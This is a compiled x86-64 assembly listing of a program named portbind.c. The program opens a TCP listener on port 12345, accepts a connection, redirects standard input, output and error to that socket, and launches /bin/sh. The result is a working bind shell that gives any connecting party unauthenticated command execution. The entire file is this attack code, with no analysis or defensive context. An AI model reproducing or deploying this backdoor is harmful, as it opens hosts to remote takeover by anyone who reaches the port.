	.file	"portbind.c"
	.section	.rodata
.LC0:
	.string	"sh"
.LC1:
	.string	"/bin/sh"
	.text
	.globl	main
	.type	main, @function
main:
.LFB2:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	pushq	%rbx
	subq	$56, %rsp
	.cfi_offset 3, -24
	movq	%fs:40, %rax
	movq	%rax, -24(%rbp)
	xorl	%eax, %eax
	movl	$0, %edx
	movl	$1, %esi
	movl	$2, %edi
	call	socket
	movl	%eax, -56(%rbp)
	movw	$2, -48(%rbp)
	movl	$0, -44(%rbp)
	movl	$12345, %edi
	call	htons
	movw	%ax, -46(%rbp)
	leaq	-48(%rbp), %rcx
	movl	-56(%rbp), %eax
	movl	$16, %edx
	movq	%rcx, %rsi
	movl	%eax, %edi
	call	bind
	movl	-56(%rbp), %eax
	movl	$5, %esi
	movl	%eax, %edi
	call	listen
	movl	-56(%rbp), %eax
	movl	$0, %edx
	movl	$0, %esi
	movl	%eax, %edi
	call	accept
	movl	%eax, -52(%rbp)
	movl	$2, -60(%rbp)
	jmp	.L2
.L3:
	movl	-60(%rbp), %edx
	movl	-52(%rbp), %eax
	movl	%edx, %esi
	movl	%eax, %edi
	call	dup2
	subl	$1, -60(%rbp)
.L2:
	cmpl	$0, -60(%rbp)
	jns	.L3
	movl	$0, %edx
	movl	$.LC0, %esi
	movl	$.LC1, %edi
	movl	$0, %eax
	call	execl
	movl	$0, %eax
	movq	-24(%rbp), %rbx
	xorq	%fs:40, %rbx
	je	.L5
	call	__stack_chk_fail
.L5:
	addq	$56, %rsp
	popq	%rbx
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE2:
	.size	main, .-main
	.ident	"GCC: (Ubuntu 4.8.4-2ubuntu1~14.04.3) 4.8.4"
	.section	.note.GNU-stack,"",@progbits
